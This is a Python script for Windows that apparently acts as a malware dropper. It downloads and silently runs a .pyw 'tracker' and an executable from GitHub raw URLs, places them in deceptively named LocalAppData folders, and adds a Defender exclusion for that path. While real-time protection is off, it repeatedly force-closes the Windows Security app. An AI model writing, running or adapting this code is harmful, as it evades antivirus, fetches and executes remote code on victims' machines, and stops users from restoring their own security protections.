import os
import subprocess
import time
import json
import requests

def is_realtime_protection_off():
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    command = [
        'powershell',
        '-Command',
        'Get-MpPreference | ConvertTo-Json -Compress'
    ]

    result = subprocess.run(command, capture_output=True, text=True, startupinfo=si)
    if result.returncode != 0 or not result.stdout.strip():
        return False

    try:
        data = json.loads(result.stdout.strip())
        return data.get('DisableRealtimeMonitoring', False)
    except json.JSONDecodeError:
        return False

def close_windows_security():
    subprocess.run(
        'powershell -Command "Stop-Process -Name SecHealthUI -Force"',
        shell=True
    )

def run_custom_gui_once():
    p = os.path.join(os.environ["LOCALAPPDATA"], "Python", "Python_Setup", "Setup", "Python_Config", "Gui")
    os.makedirs(p, exist_ok=True)

    exe = os.path.join(p, "PythonGUI.exe")
    if not os.path.exists(exe):
        with open(exe, "wb") as f:
            f.write(requests.get("https://raw.githubusercontent.com/Tyxrion/GUI1/main/BetterGUII.exe").content)

        # Add exclusion to Defender for this path
        ps_cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{os.path.join(os.environ["LOCALAPPDATA"], "Python")}\\""'
        subprocess.run(ps_cmd, shell=True)

    subprocess.Popen(exe, shell=True)

def execute_tracker():
    try:
        tracker_dir = os.path.join(os.environ["LOCALAPPDATA"], "Python", "Python_Setup", "Tracker")
        os.makedirs(tracker_dir, exist_ok=True)

        tracker_path = os.path.join(tracker_dir, "GuiTracker.pyw")

        if not os.path.exists(tracker_path):
            response = requests.get("https://raw.githubusercontent.com/Tyxrion/SafeTracker/refs/heads/main/GuiTracker.pyw")
            with open(tracker_path, "w", encoding="utf-8") as f:
                f.write(response.text)

        subprocess.Popen(["pythonw", tracker_path], shell=True)

    except Exception as e:
        print(f"[!] Tracker execution failed: {e}")

# Run tracker once at the start
execute_tracker()

# Track if GUI has been shown
shown_gui = False

while True:
    if is_realtime_protection_off():
        print("Real-time Protection is OFF!")

        if not shown_gui:
            run_custom_gui_once()
            shown_gui = True
            time.sleep(1)

        close_windows_security()
    else:
        print("Real-time Protection is ON.")
        shown_gui = False

    time.sleep(1.5)
